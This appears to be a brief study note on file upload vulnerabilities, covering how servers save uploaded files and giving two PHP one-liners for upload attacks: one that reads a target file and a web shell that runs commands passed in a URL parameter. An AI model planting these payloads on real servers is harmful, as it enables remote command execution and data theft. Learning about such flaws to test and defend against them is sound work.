What are file upload vulnerabilities?


File upload vulnerabilities are whena web server allows users to upload files without validating them to be safe.

Some cases will automatically execute the uploaded file while others will require a follow up HTTP request for the file.

Some PHP one liners:

<?php echo file_get_contents('/path/to/target/file'); ?>

<?php echo system($_GET['command']); ?>

Web servers often use the filename field in multipart/form-data requests to determine the name and lcoation where the file should be saved.
